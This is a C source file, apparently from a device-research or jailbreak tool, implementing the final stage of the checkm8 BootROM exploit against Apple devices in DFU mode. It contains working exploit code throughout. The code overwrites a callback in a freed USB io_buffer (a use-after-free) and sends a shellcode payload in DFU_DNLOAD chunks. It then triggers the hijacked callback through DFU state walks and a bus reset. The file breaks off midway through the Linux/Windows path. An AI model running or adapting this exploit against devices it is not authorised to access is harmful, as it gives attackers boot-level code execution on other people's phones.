/* checkm8_patch.c -- checkm8 stage 4: callback setup + payload send */

#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libusb.h>

#if defined(__APPLE__)
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOCFPlugIn.h>
#include <IOKit/usb/IOUSBLib.h>
#endif

#include "dfu/dfu_handler.h"
#include "dfu/checkm8.h"
#include "dfu/checkm8_internal.h"
#include "dfu/dfu_proto.h"
#include "device/chip_db.h"
#include "device/usb_dfu.h"
#include "util/usb_helpers.h"
#include "util/log.h"

#if defined(__APPLE__)
#include "dfu/iokit_usb.h"
#endif

/* ------------------------------------------------------------------ */
/* macOS IOKit direct USB backend                                      */
/*                                                                     */
/* libusb's darwin backend uses DeviceRequestAsyncTO for ALL control    */
/* transfers, even libusb_control_transfer().  After an EP0 STALL      */
/* the async path never recovers -- transfers time out because IOKit's */
/* internal pipe state blocks new async dispatches.                    */
/*                                                                     */
/* IOKit's DeviceRequestTO (truly synchronous) goes through a          */
/* different kernel code path that handles EP0 STALL recovery.         */
/* ------------------------------------------------------------------ */

#if defined(__APPLE__)

typedef struct {
    IOUSBDeviceInterface320 **device;
    CFRunLoopSourceRef async_source;
} iokit_dfu_handle_t;

static int iokit_open_dfu(iokit_dfu_handle_t *h)
{
    CFMutableDictionaryRef matching;
    io_service_t serv;
    IOCFPlugInInterface **plugin;
    SInt32 score;
    IOReturn kr;
    int16_t vid = 0x05AC;
    int16_t pid = 0x1227;
    CFNumberRef cf_vid, cf_pid;

    memset(h, 0, sizeof(*h));

    matching = IOServiceMatching(kIOUSBDeviceClassName);
    if (!matching) {
        log_error("IOKit: IOServiceMatching failed");
        return -1;
    }

    cf_vid = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt16Type, &vid);
    cf_pid = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt16Type, &pid);
    CFDictionarySetValue(matching, CFSTR(kUSBVendorID), cf_vid);
    CFDictionarySetValue(matching, CFSTR(kUSBProductID), cf_pid);
    CFRelease(cf_vid);
    CFRelease(cf_pid);

    serv = IOServiceGetMatchingService(0, matching);
    if (!serv) {
        log_error("IOKit: DFU device not found (05ac:1227)");
        return -1;
    }

    kr = IOCreatePlugInInterfaceForService(serv, kIOUSBDeviceUserClientTypeID,
                                           kIOCFPlugInInterfaceID,
                                           &plugin, &score);
    IOObjectRelease(serv);
    if (kr != kIOReturnSuccess || !plugin) {
        log_error("IOKit: plugin interface failed: 0x%x", kr);
        return -1;
    }

    kr = (*plugin)->QueryInterface(plugin,
            CFUUIDGetUUIDBytes(kIOUSBDeviceInterfaceID320),
            (LPVOID *)&h->device);
    IODestroyPlugInInterface(plugin);
    if (kr != kIOReturnSuccess || !h->device) {
        log_error("IOKit: device interface failed: 0x%x", kr);
        return -1;
    }

    /* Open the device with a short retry so the IOKit port can settle. */
    {
        int open_retries;
        int opened = 0;
        for (open_retries = 0; open_retries < 20; open_retries++) {
            kr = (*h->device)->USBDeviceOpen(h->device);
            if (kr == kIOReturnSuccess) {
                opened = 1;
                break;
            }
            log_debug("IOKit: USBDeviceOpen retry %d/20: 0x%x", open_retries + 1, kr);
            usleep(50000);
        }
        if (!opened) {
            log_error("IOKit: USBDeviceOpen failed: 0x%x", kr);
            (*h->device)->Release(h->device);
            h->device = NULL;
            return -1;
        }
    }

    kr = (*h->device)->SetConfiguration(h->device, 1);
    log_info("IOKit: SetConfiguration(1) ret=0x%x", kr);

    kr = (*h->device)->CreateDeviceAsyncEventSource(h->device,
                                                     &h->async_source);
    if (kr == kIOReturnSuccess && h->async_source) {
        CFRunLoopAddSource(CFRunLoopGetCurrent(), h->async_source,
                           kCFRunLoopDefaultMode);
        log_info("IOKit: async event source added to run loop");
    }

    log_info("IOKit: DFU device opened");
    return 0;
}

static int iokit_ctrl_transfer(iokit_dfu_handle_t *h,
                               uint8_t bmRequestType, uint8_t bRequest,
                               uint16_t wValue, uint16_t wIndex,
                               void *data, uint16_t wLength,
                               uint32_t timeout_ms)
{
    IOUSBDevRequestTO req;
    IOReturn kr;

    memset(&req, 0, sizeof(req));
    req.bmRequestType = bmRequestType;
    req.bRequest = bRequest;
    req.wValue = wValue;
    req.wIndex = wIndex;
    req.wLength = wLength;
    req.pData = data;
    req.completionTimeout = timeout_ms;
    req.noDataTimeout = timeout_ms;

    kr = (*h->device)->DeviceRequestTO(h->device, &req);

    if (kr == kIOReturnSuccess)
        return (int)req.wLenDone;
    if (kr == kIOUSBPipeStalled) {
        log_warn("IOKit DeviceRequestTO: STALL (wLenDone=%u)", req.wLenDone);
        return LIBUSB_ERROR_PIPE;
    }
    if (kr == kIOReturnAborted) {
        log_warn("IOKit DeviceRequestTO: ABORTED (wLenDone=%u)",
                 req.wLenDone);
        return LIBUSB_ERROR_INTERRUPTED;
    }

    log_warn("IOKit DeviceRequestTO failed: IOReturn=0x%x wLenDone=%u",
             kr, req.wLenDone);
    return LIBUSB_ERROR_OTHER;
}

static void iokit_close(iokit_dfu_handle_t *h)
{
    if (!h)
        return;
    if (h->async_source) {
        CFRunLoopRemoveSource(CFRunLoopGetCurrent(), h->async_source,
                              kCFRunLoopDefaultMode);
        CFRelease(h->async_source);
        h->async_source = NULL;
    }
    if (h->device) {
        (*h->device)->USBDeviceClose(h->device);
        (*h->device)->Release(h->device);
        h->device = NULL;
    }
}

#endif /* __APPLE__ */

/* ------------------------------------------------------------------ */
/* DFU_GETSTATUS (quick, fire-and-forget)                              */
/* ------------------------------------------------------------------ */

/*
 * dfu_getstatus_quick -- Send DFU_GETSTATUS with a short 200ms timeout.
 *
 * Purpose: Trigger the dfuDNLOAD-SYNC → dfuDNLOAD-IDLE state transition
 * in the device's DFU state machine.  On usbipd the STATUS response is
 * always dropped (we get LIBUSB_ERROR_TIMEOUT), but the device processes
 * the SETUP packet and makes the transition anyway.  Sending GETSTATUS
 * here allows the next DFU_DNLOAD or the final zero-length DFU_DNLOAD
 * (MANIFEST trigger) to be accepted by the device.
 */
static void dfu_getstatus_quick(libusb_device_handle *usb)
{
    unsigned char buf[6];
    int ret = usb_ctrl_transfer_raw(usb, 0xA1, 0x03, 0, 0,
                                    buf, sizeof(buf), 200);
    if (ret == 6) {
        log_info("dfu_getstatus_quick: state=0x%02X status=0x%02X "
                 "(device responded -- may be non-usbipd path)", buf[4], buf[0]);
    } else if (ret == LIBUSB_ERROR_TIMEOUT) {
        log_info("dfu_getstatus_quick: timed out (usbipd normal) -- "
                 "device should have transitioned dfuDNLOAD-SYNC->IDLE");
    } else {
        log_info("dfu_getstatus_quick: ret=%d (%s)", ret, libusb_strerror(ret));
    }
}


/*
 * build_overwrite_64 -- Build a 64-bit DFU callback structure.
 *
 * For chips without tlbi: callback = insecure_memory_base.
 * For chips with tlbi (newer): callback = nop_addr,
 *   next = insecure_memory_base.
 */
static void build_overwrite_64(checkm8_overwrite_t *ow,
                               const chip_info_t *chip)
{
    memset(ow, 0, sizeof(*ow));

    if (CPID_HAS_TLBI(chip)) {
        /* Newer path: callback -> nop_addr, next -> start of redirect chain
         * in the payload.  The redirect chain is written at
         * insecure_memory_base + offsetof(dfu_callback_t, callback)
         * by usb_rop_callbacks().  iBoot processes this as a linked list
         * of callback structs; the first entry is at base + 0x20. */
        ow->callback.callback = chip->nop_addr;
        ow->callback.next     = chip->insecure_memory_base
                                    + offsetof(dfu_callback_t, callback);
        log_debug("build_overwrite_64: callback=0x%llX (nop), "
                  "next=0x%llX (redirect_chain)",
                  (unsigned long long)ow->callback.callback,
                  (unsigned long long)ow->callback.next);
    } else {
        /* Older path: callback -> insecure_memory_base directly */
        ow->callback.callback = chip->insecure_memory_base;
        log_debug("build_overwrite_64: callback=0x%llX (insecure_mem)",
                  (unsigned long long)ow->callback.callback);
    }
}

/*
 * build_overwrite_armv7 -- Build a 32-bit ARMv7 DFU callback structure.
 */
static void build_overwrite_armv7(dfu_callback_armv7_t *cb,
                                  const chip_info_t *chip)
{
    memset(cb, 0, sizeof(*cb));
    cb->callback = (uint32_t)chip->insecure_memory_base;
    log_debug("build_overwrite_armv7: callback=0x%X",
              cb->callback);
}

/* ------------------------------------------------------------------ */
/* Send overwrite via control request                                  */
/* ------------------------------------------------------------------ */

/*
 * send_overwrite -- Send the callback data to the device.
 *
 *   bmRequestType = 0x02 (host-to-device, standard, endpoint)
 *   bRequest      = 0x03
 *   wValue        = 0
 *   wIndex        = 0x80
 *
 * The transfer must STALL -- that confirms the data landed in the
 * target region. Uses the full USB timeout (not async) so we can
 * check the STALL return code.
 */
static int send_overwrite(libusb_device_handle *usb,
                          const void *data, size_t len)
{
    int ret;

    ret = usb_ctrl_transfer_raw(usb, 0x02, 0x03, 0, 0x80,
                                (unsigned char *)(uintptr_t)data,
                                (uint16_t)len, USB_TIMEOUT_MS);

    /*
     * libusb returns LIBUSB_ERROR_PIPE for a STALL.
     *
     * On usbipd-win the STALL for this transfer may arrive as
     * LIBUSB_ERROR_TIMEOUT instead of PIPE.  Accept both as
     * "data landed" -- the following payload send will confirm.
     */
    if (ret == LIBUSB_ERROR_PIPE) {
        log_info("send_overwrite: STALL (PIPE) received -- write confirmed, "
                 "%zu bytes sent", len);
        return 0;
    }

    if (ret == LIBUSB_ERROR_TIMEOUT) {
        log_info("send_overwrite: TIMEOUT (usbipd STALL quirk for data transfers) "
                 "-- treating as write landed, %zu bytes", len);
        return 0;
    }

    /* Any other result (including success) is unexpected */
    log_error("send_overwrite: expected STALL, got %d (%s)",
              ret, libusb_strerror(ret));
    return -1;
}

/* ------------------------------------------------------------------ */
/* Send payload in DFU_MAX_TRANSFER_SZ chunks                          */
/* ------------------------------------------------------------------ */

/*
 * send_payload_chunks -- Send payload data via DFU_DNLOAD.
 *
 * All chunks use wValue=0 (block number 0).
 * The block number is NOT incremented between chunks.
 *
 * Uses raw usb_ctrl_transfer instead of dfu_dnload() to avoid the
 * latter's block-number parameter being passed as wValue.
 */
static int send_payload_chunks(libusb_device_handle *usb,
                               const uint8_t *payload, size_t payload_len)
{
    size_t offset = 0;
    size_t chunk;
    int ret;

    while (offset < payload_len) {
        chunk = payload_len - offset;
        if (chunk > DFU_MAX_TRANSFER_SZ)
            chunk = DFU_MAX_TRANSFER_SZ;

        /* bmRequestType=0x21, bRequest=DFU_DNLOAD(1), wValue=0, wIndex=0
         * Use a generous timeout to ensure the full DATA phase completes.
         * On usbipd the STATUS ACK is dropped (TIMEOUT) but the device
         * receives all the bytes.
         *
         * On macOS, the handle was refreshed (close+reopen+SET_CONFIGURATION)
         * after the overwrite STALL, so the sync path works cleanly.
         * The async path (DeviceRequestAsync) does not complete on a
         * reopened handle even with fresh pipe objects. */
        ret = usb_ctrl_transfer_raw(usb, 0x21, DFU_REQ_DNLOAD, 0, 0,
                                    (unsigned char *)(uintptr_t)(payload + offset),
                                    (uint16_t)chunk, USB_TIMEOUT_MS);
        log_info("send_payload_chunks: offset=%zu chunk=%zu ret=%d (%s)",
                 offset, chunk, ret, ret < 0 ? libusb_strerror(ret) : "ok");
        if (ret < 0 && ret != LIBUSB_ERROR_TIMEOUT) {
            log_error("send_payload_chunks: hard error at offset %zu: %s",
                      offset, libusb_strerror(ret));
            return -1;
        }

        offset += chunk;
    }

    log_debug("send_payload_chunks: sent %zu bytes total", payload_len);
    return 0;
}

/* ------------------------------------------------------------------ */
/* Finalize DFU transfer (suffix + zero-length + USB reset)            */
/* ------------------------------------------------------------------ */

/*
 * send_dfu_finalize -- Finalize the DFU download:
 *
 * 1. Send DFU_FILE_SUFFIX_LEN (16) zero bytes via DFU_DNLOAD wValue=0
 * 2. Send zero-length DFU_DNLOAD wValue=0 → device enters MANIFEST-SYNC
 * 3. DFU_GETSTATUS × 3 → device transitions through MANIFEST states
 *    (on usbipd these timeout but the device processes the transitions)
 * 4. libusb_reset_device → sends USB bus reset; device in MANIFEST-WAIT-RESET
 *    exits, fires the dfu_handle_bus_reset callback → completion
 *
 * The USB bus reset fires the checkm8 callback, not the zero-length
 * DFU_DNLOAD.  The zero-length DFU_DNLOAD just puts DFU into
 * MANIFEST-WAIT-RESET state so it's ready to act on the bus reset.
 *
 * WARNING: On usbipd, libusb_reset_device MAY cause the device to reboot
 * out of DFU if not yet in the correct state.
 * This is acceptable -- the retry loop will reconnect.
 */
static int send_dfu_finalize(libusb_device_handle *usb)
{
    uint8_t suffix[DFU_FILE_SUFFIX_LEN];
    int ret;

    /* Step 1: 16 zero bytes as DFU_DNLOAD (DFU file suffix). */
    memset(suffix, 0, sizeof(suffix));
    ret = usb_ctrl_transfer_raw(usb, 0x21, DFU_REQ_DNLOAD, 0, 0,
                                suffix, DFU_FILE_SUFFIX_LEN, USB_TIMEOUT_MS);
    log_info("send_dfu_finalize: 16-byte suffix ret=%d (%s)",
             ret, ret < 0 ? libusb_strerror(ret) : "ok");

    /*
     * Step 2: Zero-length DFU_DNLOAD -- triggers dfuMANIFEST-SYNC entry.
     * On usbipd STATUS ACK is dropped (TIMEOUT) but the device transitions.
     */
    ret = usb_ctrl_transfer_no_data_raw(usb, 0x21, DFU_REQ_DNLOAD,
                                        0, 0, USB_TIMEOUT_MS);
    log_info("send_dfu_finalize: zero-length DNLOAD ret=%d (%s)",
             ret, ret < 0 ? libusb_strerror(ret) : "ok");

    /*
     * Step 3: DFU_GETSTATUS × 3 to walk through MANIFEST states:
     *   MANIFEST-SYNC → MANIFEST → MANIFEST-WAIT-RESET
     * On usbipd responses are dropped (TIMEOUT) but the device processes
     * the state transitions when it receives the SETUP packets.
     * Three DFU_GETSTATUS calls walk through the state machine.
     */
    dfu_getstatus_quick(usb);  /* MANIFEST-SYNC → MANIFEST */
    dfu_getstatus_quick(usb);  /* MANIFEST (callback fires) */
    dfu_getstatus_quick(usb);  /* MANIFEST-WAIT-RESET */

    /*
     * Step 4: USB bus reset.
     * This fires the dfu_handle_bus_reset callback: the device exits
     * dfuMANIFEST-WAIT-RESET, the callback fires, the completion marker
     * is set, and the device stays in DFU (instead of rebooting).
     *
     * On usbipd this MAY cause the device to reboot out of DFU if we're
     * not actually in MANIFEST-WAIT-RESET.  The caller handles this by
     * closing the handle, waiting for re-enumeration, and checking status.
     */
    log_info("send_dfu_finalize: USB bus reset (libusb_reset_device)...");
    ret = libusb_reset_device(usb);
    log_info("send_dfu_finalize: libusb_reset_device ret=%d (%s)",
             ret, ret < 0 ? libusb_strerror(ret) : "ok");

    return 0;
}

/* ------------------------------------------------------------------ */
/* Stage 4: Patch -- callback setup + send payload                     */
/* ------------------------------------------------------------------ */

int checkm8_stage_patch(dfu_ctx_t *ctx)
{
    const chip_info_t *chip;
    uint8_t iserial_idx;

    if (!ctx || !ctx->dev || !ctx->chip)
        return -1;

    chip = ctx->chip;
    iserial_idx = ctx->dev->iserial_index ? ctx->dev->iserial_index : 3;
    log_info("checkm8: stage 4/4 -- callback + payload");

    log_debug("checkm8_stage_patch: chip=%s cpid=0x%04X "
              "insecure_memory_base=0x%llX",
              chip->name, chip->cpid,
              (unsigned long long)chip->insecure_memory_base);

    /* Assemble the payload if not already done */
    if (!ctx->payload_buf) {
        log_debug("checkm8_stage_patch: assembling payload...");
        if (assemble_payload(ctx) != 0) {
            log_error("checkm8_stage_patch: payload assembly failed");
            return -1;
        }
        log_info("checkm8_stage_patch: payload assembled, %zu bytes",
                 ctx->payload_len);
    } else {
        log_debug("checkm8_stage_patch: payload already assembled (%zu bytes)",
                  ctx->payload_len);
    }

#if defined(__APPLE__)
    /*
     * macOS Apple Silicon: gaster stage-4 order (overwrite FIRST).
     *
     * The UAF'd io_request's callback is armed by the overwrite.  The
     * callback FIRES when the DFU state machine completes that pending
     * request during the final MANIFEST walk (3× GETSTATUS).  Skipping
     * the walk (previous payload-first variant) means the callback
     * never fires -- confirmed on device: stage 4 "completed" but no
     * PWND marker.
     *
     * Gaster sequence:
     *   1. overwrite via SET_FEATURE (expects STALL)
     *   2. clear the EP0 halt (AbortPipeZero) -- payload needs EP0
     *   3. payload via DFU_DNLOAD chunks
     *   4. 16-byte zero suffix DFU_DNLOAD
     *   5. zero-length DFU_DNLOAD  -> dfuMANIFEST-SYNC
     *   6. 3x DFU_GETSTATUS        -> walk to dfuMANIFEST-WAIT-RESET,
     *                                 callback fires during MANIFEST
     *   7. ResetDevice (port-level bus reset) -> shellcode runs
     *
     * When the shared IOKit backend (iokit_usb) is active, EP0 is
     * clean and all transfers route through iokit_usb_ctrl_transfer.
     * When iokit_usb is NOT active, use the local iokit_dfu_handle_t.
     */
    {
        iokit_dfu_handle_t iokit_local;
        uint8_t status_buf[6];
        uint8_t suffix[DFU_FILE_SUFFIX_LEN];
        size_t offset;
        int kr;
        int use_shared = iokit_usb_is_active();

        memset(&iokit_local, 0, sizeof(iokit_local));

        if (use_shared) {
            log_info("checkm8_stage_patch: macOS -- gaster order "
                     "(overwrite first), via shared IOKit");
        } else {
            log_info("checkm8_stage_patch: macOS -- gaster order "
                     "(overwrite first), via local IOKit");
        }

        if (!use_shared) {

            usb_dfu_close(ctx->dev->usb);
            ctx->dev->usb = NULL;
            usleep(10000);

            if (iokit_open_dfu(&iokit_local) != 0) {
                log_error("checkm8_stage_patch: IOKit open (for reset) failed");
                return -1;
            }
            log_info("checkm8_stage_patch: IOKit ResetDevice + "
                     "USBDeviceReEnumerate (clearing XHCI EP0 state)");
            (*iokit_local.device)->ResetDevice(iokit_local.device);
            (*iokit_local.device)->USBDeviceReEnumerate(iokit_local.device, 0);
            iokit_close(&iokit_local);
            usleep(1500000);

            {
                int iokit_retries;
                int iokit_opened = 0;
                for (iokit_retries = 0; iokit_retries < 5; iokit_retries++) {
                    if (iokit_open_dfu(&iokit_local) == 0) {
                        iokit_opened = 1;
                        break;
                    }
                    log_info("checkm8_stage_patch: IOKit reopen retry %d/5",
                             iokit_retries + 1);
                    usleep(300000);
                }
                if (!iokit_opened) {
                    log_error("checkm8_stage_patch: IOKit reopen after "
                              "reset failed");
                    return -1;
                }
            }

            {
                uint8_t prime_buf[6];
                int prime_ret = iokit_ctrl_transfer(&iokit_local,
                                    0xA1, 0x03, 0, 0,
                                    prime_buf, 6, USB_TIMEOUT_MS);
                log_info("checkm8_stage_patch: pipe prime (GETSTATUS) "
                         "ret=%d state=0x%02X", prime_ret,
                         prime_ret >= 6 ? prime_buf[4] : 0xFF);
                if (prime_ret < 0) {
                    uint8_t gs_buf[2];
                    int gs_ret = iokit_ctrl_transfer(&iokit_local,
                                    0x80, 0x00, 0, 0,
                                    gs_buf, 2, USB_TIMEOUT_MS);
                    log_info("checkm8_stage_patch: pipe prime fallback "
                             "(GET_STATUS) ret=%d", gs_ret);
                }
            }

            /* From here on, the local handle is used for all transfers.
             * We need a macro/helper to unify the call sites. */
        }

        /* Helper macro: route to shared or local IOKit handle */
        #define IOKIT_XFER(rt, rq, wv, wi, d, wl, to) \
            (use_shared \
                ? iokit_usb_ctrl_transfer((rt),(rq),(wv),(wi),(d),(wl),(to)) \
                : iokit_ctrl_transfer(&iokit_local,(rt),(rq),(wv),(wi),(d),(wl),(to)))

        /*
         * Apple Silicon M-series XHCI constraints (why gaster's exact
         * flow can't be copied verbatim over USB-C):
         *   - multi-packet DATA stages fail via DeviceRequestTO --
         *     every DFU_DNLOAD must fit in ONE 64-byte DATA packet
         *   - a STALL does not auto-clear the EP0 halt -- AbortPipeZero
         *     is required between every STALLing request and the next
         *     transfer, otherwise the controller refuses to send
         *   - a NotResponding user-client poisons the next transfer
         *     (NotReady) -- prime the pipe before the overwrite
         */
        /* Prime: clear any halt left by the spray's stall, verify EP0. */
        if (use_shared) {
            iokit_usb_abort_pipe_zero();
        } else {
            (*iokit_local.device)->USBDeviceAbortPipeZero(iokit_local.device);
        }
        usleep(50000);
        {
            uint8_t pre_state = 0xFF;
            kr = IOKIT_XFER(0xA1, 0x05, 0, 0,
                            &pre_state, 1, USB_TIMEOUT_MS);
            log_info("checkm8_stage_patch: pre-overwrite GETSTATE ret=%d "
                     "state=0x%02X", kr, pre_state);
        }

        /* Step 1: Callback overwrite -> STALL (arms the UAF callback).
         *
         * bmRequestType=2 (host-to-device, standard, endpoint),
         * bRequest=3 (SET_FEATURE), wValue=0, wIndex=0x80.
         * The DATA phase writes into the freed io_buffer (UAF target)
         * before the device STALLs the request.  A 5ms timeout: the
         * STALL should arrive immediately after the DATA phase. */
        if (CPID_HAS_TLBI(chip)) {
            uint8_t leak_buf[DFU_MAX_TRANSFER_SZ];
            log_info("checkm8_stage_patch: TLBI -- IOKit stall+leak");
            kr = IOKIT_XFER(0x02, 0x03, 0, 0x80, NULL, 0, 5);
            log_info("checkm8_stage_patch: IOKit stall ret=%d", kr);
            kr = IOKIT_XFER(0x80, 0x06,
                            (uint16_t)(0x0300 | iserial_idx),
                            0x040A, leak_buf, DFU_MAX_TRANSFER_SZ, 5);
            log_info("checkm8_stage_patch: IOKit leak ret=%d", kr);
        }

        if (CPID_IS_ARMV7(chip->cpid)) {
            dfu_callback_armv7_t cb;
            build_overwrite_armv7(&cb, chip);
            log_info("checkm8_stage_patch: overwrite ARMv7 "
                     "(%zu bytes)", sizeof(cb));
            kr = IOKIT_XFER(0x02, 0x03, 0, 0x80,
                            &cb, (uint16_t)sizeof(cb), 5);
        } else {
            checkm8_overwrite_t ow;
            build_overwrite_64(&ow, chip);
            log_info("checkm8_stage_patch: overwrite AArch64 "
                     "(callback=0x%llx, %zu bytes)",
                     (unsigned long long)ow.callback.callback,
                     sizeof(ow));
            kr = IOKIT_XFER(0x02, 0x03, 0, 0x80,
                            &ow, (uint16_t)sizeof(ow), 5);
        }

        /* gaster expects a STALL here.  TIMEOUT/OTHER is fine too --
         * what matters is that the DATA phase reached the device. */
        if (kr == LIBUSB_ERROR_PIPE) {
            log_info("checkm8_stage_patch: overwrite STALL confirmed "
                     "(UAF write landed)");
        } else {
            log_warn("checkm8_stage_patch: overwrite ret=%d (expected "
                     "STALL=%d) -- continuing",
                     kr, LIBUSB_ERROR_PIPE);
        }

        /*
         * Step 2: Clear the EP0 halt the STALL left behind, so the
         * payload DFU_DNLOADs can go out.
         * (The NoDevice recovery inside iokit_usb_ctrl_transfer handles
         * a re-enumerated IOService transparently.)
         *
         * APPLE SILICON M-SERIES recovery semantics (on-device logs):
         * exactly ONE AbortPipeZero here.  The first ~2 transfers after
         * the overwrite STALL are eaten by the XHCI controller (they
         * return TIMEOUT even though AbortPipeZero reports success);
         * the pipe then recovers BY ITSELF.  A SECOND AbortPipeZero in
         * this window re-poisons the ring -- every later transfer times
         * out forever (seen: 15 consecutive -7 after a second abort).
         *
         * So after the single abort, poll a harmless GETSTATE
         * (bmRequestType=0xA1, valid in any DFU state, no side effects)
         * until EP0 answers.  All retries must succeed before the
         * payload goes out -- a partially-delivered payload would be
         * worse than a clean stage-4 failure.
         */
        if (use_shared) {
            iokit_usb_abort_pipe_zero();
        } else {
            (*iokit_local.device)->USBDeviceAbortPipeZero(iokit_local.device);
        }
        {
            int ci;
            int canary_ok = 0;
            /*
             * Recovery window is ~10-11 s (Run A on-device: two 5s-timeout
             * transfers were eaten before the pipe answered again -- the
             * SECOND long transfer completed the moment EP0 came back).
             *
             * Two-phase poll:
             *   phase 1: quick 500 ms probes (cheap, early exit if the
             *            ring re-arms fast),
             *   phase 2: LONG 5 s polls.  Cancelling a stuck transfer is
             *            itself a mini-abort of the ring (Run B: repeated
             *              short probes + an extra AbortPipeZero kept the
             *            ring poisoned for 15+ transfers), so a long poll
             *            that spans the recovery moment completes instead
             *            of being cancelled -- exactly Run A's pattern.
             */
            for (ci = 0; ci < 7 && !canary_ok; ci++) {
                unsigned to_ms = (ci < 4) ? 500u : 5000u;
                uint8_t canary_state = 0xFF;
                usleep(500000); /* let the XHCI EP0 ring re-arm */
                kr = IOKIT_XFER(0xA1, 0x05, 0, 0,
                                &canary_state, 1, to_ms);
                log_info("checkm8_stage_patch: EP0 canary GETSTATE "
                         "[%d/7 to=%ums] ret=%d state=0x%02X",
                         ci + 1, to_ms, kr, canary_state);
                if (kr >= 0)
                    canary_ok = 1;
            }
            if (!canary_ok) {
                log_error("checkm8_stage_patch: EP0 never recovered "
                          "after overwrite STALL (~21 s) -- aborting "
                          "stage 4");
                if (!use_shared) iokit_close(&iokit_local);
                return -1;
            }
        }

        /* Step 3: Payload via DFU_DNLOAD chunks.
         *
         * APPLE SILICON M-SERIES: the XHCI controller rejects control
         * transfers whose DATA stage spans multiple packets
         * (kIOUSBNotSent1Err / timeout).  Every DFU_DNLOAD must fit in
         * a single 64-byte EP0 packet, so chunk at EP0_MAX_PACKET_SZ --
         * the BootROM DFU accumulates consecutive DNLOAD payloads in
         * the DFU image buffer at insecure_memory_base. */
        log_info("checkm8_stage_patch: sending payload (%zu bytes in "
                 "%u-byte single-packet chunks)", ctx->payload_len,
                 (unsigned)EP0_MAX_PACKET_SZ);
        {
            int consecutive_timeouts = 0;
            for (offset = 0; offset < ctx->payload_len; ) {
                size_t chunk = ctx->payload_len - offset;
                if (chunk > EP0_MAX_PACKET_SZ)
                    chunk = EP0_MAX_PACKET_SZ;
                kr = IOKIT_XFER(0x21, DFU_REQ_DNLOAD, 0, 0,
                                (void *)(ctx->payload_buf + offset),
                                (uint16_t)chunk, USB_TIMEOUT_MS);
                if (kr != chunk) {
                    log_warn("checkm8_stage_patch: chunk offset=%zu "
                             "ret=%d (wanted %zu)", offset, kr, chunk);
                }
                if (kr < 0 && kr != LIBUSB_ERROR_PIPE
                           && kr != LIBUSB_ERROR_TIMEOUT) {
                    log_error("checkm8_stage_patch: payload send failed "
                              "at offset %zu: ret=%d", offset, kr);
                    if (!use_shared) iokit_close(&iokit_local);
                    return -1;
                }
                /* A timed-out chunk means the bytes never reached the
                 * DFU buffer.  Three in a row: the pipe died -- don't
                 * pretend the payload landed. */
                if (kr < 0) {
                    if (++consecutive_timeouts >= 3) {
                        log_error("checkm8_stage_patch: 3 consecutive "
                                  "chunk timeouts at offset %zu -- EP0 "
                                  "dead, aborting", offset);
                        if (!use_shared) iokit_close(&iokit_local);
                        return -1;
                    }
                } else {
                    consecutive_timeouts = 0;
                    offset += kr > 0 ? (size_t)kr : chunk;
                }
                usleep(2000); /* BootROM processes DNLOADs sequentially */
            }
        }
        log_info("checkm8_stage_patch: payload sent (%zu bytes total)",
                 ctx->payload_len);

        /* Step 4: 16-byte zero DFU file suffix (gaster sends this). */
        memset(suffix, 0, sizeof(suffix));
        kr = IOKIT_XFER(0x21, DFU_REQ_DNLOAD, 0, 0,
                        suffix, DFU_FILE_SUFFIX_LEN, USB_TIMEOUT_MS);
        log_info("checkm8_stage_patch: 16-byte suffix ret=%d", kr);

        /* Step 5: Zero-length DFU_DNLOAD -> dfuMANIFEST-SYNC. */
        kr = IOKIT_XFER(0x21, DFU_REQ_DNLOAD, 0, 0,
                        NULL, 0, USB_TIMEOUT_MS);
        log_info("checkm8_stage_patch: zero-len DNLOAD ret=%d", kr);

        /* Step 6: 3x DFU_GETSTATUS walks MANIFEST-SYNC -> MANIFEST ->
         * MANIFEST-WAIT-RESET.  During MANIFEST the device completes
         * the pending (hijacked) io_request -- the overwritten callback
         * fires HERE.  Errors are expected once the shellcode runs. */
        {
            int gi;
            for (gi = 0; gi < 3; gi++) {
                kr = IOKIT_XFER(0xA1, 0x03, 0, 0,
                                status_buf, 6, USB_TIMEOUT_MS);
                log_info("checkm8_stage_patch: GETSTATUS[%d] ret=%d "
                         "state=0x%02X", gi, kr,
                         kr >= 6 ? status_buf[4] : 0xFF);
            }
        }

        /* Step 7: Bus reset -- fires dfu_handle_bus_reset, whose
         * pointer now points at the shellcode. */
        log_info("checkm8_stage_patch: IOKit ResetDevice (port-level "
                 "bus reset)");
        if (use_shared) {
            iokit_usb_reset_device();
            usleep(50000);
            log_info("checkm8_stage_patch: IOKit USBDeviceReEnumerate");
            iokit_usb_reenumerate();
        } else {
            (*iokit_local.device)->ResetDevice(iokit_local.device);
            usleep(50000);
            log_info("checkm8_stage_patch: IOKit USBDeviceReEnumerate");
            (*iokit_local.device)->USBDeviceReEnumerate(iokit_local.device, 0);
            iokit_close(&iokit_local);
        }

        #undef IOKIT_XFER

        ctx->phase = DFU_PHASE_PATCH;
        log_info("checkm8: stage 4 complete -- gaster order via IOKit");
        return 0;
    }
#else
    /*
     * Linux/Windows: libusb handles EP0 STALL correctly.
     * Use libusb for entire stage 4.
     */
    {
        libusb_device_handle *usb = ctx->dev->usb;

        /* TLBI chips: pre-overwrite stall+leak */
        if (CPID_HAS_TLBI(chip)) {
            log_debug("checkm8_stage_patch: TLBI -- pre-overwrite stall+leak");
            if (!checkm8_usb_request_stall(usb) ||
                !checkm8_usb_request_leak(usb, iserial_idx)) {
                log_error("checkm8_stage_patch: pre-overwrite stall/leak failed");
                return -1;
            }
            log_debug("checkm8_stage_patch: pre-overwrite stall+leak OK");
        }

        /* Overwrite */
        if (CPID_IS_ARMV7(chip->cpid)) {
            dfu_callback_armv7_t cb;
            build_overwrite_armv7(&cb, chip);
            log_info("checkm8_stage_patch: sending ARMv7 overwrite (%zu bytes)",
                     sizeof(cb));
            if (send_overwrite(usb, &cb, sizeof(cb)) != 0)
                return -1;
        } else {
            checkm8_overwrite_t ow;
            build_overwrite_64(&ow, chip);
            log_info("checkm8_stage_patch: sending AArch64 overwrite (%zu bytes)",
                     sizeof(ow));
            if (send_overwrite(usb, &ow, sizeof(ow)) != 0)
                return -1;
        }
        log_info("checkm8_stage_patch: overwrite STALL received");

        /* Payload */
        log_info("checkm8_stage_patch: sending payload (%zu bytes in %zu-byte chunks)",
                 ctx->payload_len, (size_t)DFU_MAX_TRANSFER_SZ);
        if (send_payload_chunks(usb, ctx->payload_buf,
                                ctx->payload_len) != 0) {
            log_error("checkm8_stage_patch: payload send failed");
            return -1;
        }
